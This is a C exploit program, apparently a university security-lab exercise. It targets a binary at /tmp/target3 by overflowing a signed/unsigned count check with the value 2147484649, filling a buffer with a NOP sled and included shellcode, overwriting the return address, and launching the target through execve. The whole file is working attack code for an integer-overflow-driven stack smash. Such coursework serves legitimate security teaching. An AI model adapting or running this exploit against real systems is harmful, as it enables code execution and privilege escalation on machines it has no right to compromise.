#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

#define NOP (0x90)
#define PAYLOAD_SIZE (20020+20)
#define RET_ADDR (0xbfff61b8+5)

int main(void)
{
    char *args[3];
    char *env[1];
  
    char payload[PAYLOAD_SIZE];
    const int count=0x800003e9;
    char *countStr="2147484649,";
    /* Build payload */
    memset(payload, NOP, PAYLOAD_SIZE);
    memcpy(payload, countStr, strlen(countStr));
    memcpy(payload+16, shellcode, strlen(shellcode));
    *(int *)(payload+11+20000+4)=RET_ADDR; 
    /* some math 
     * (signed)count < MW
     * (unsigned)count*20 mod 2^32 = 1000*20+4+1
     *
     * */

    args[0] = TARGET; 
    args[1] = payload; 
    args[2] = NULL;
    env[0] = NULL;
    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
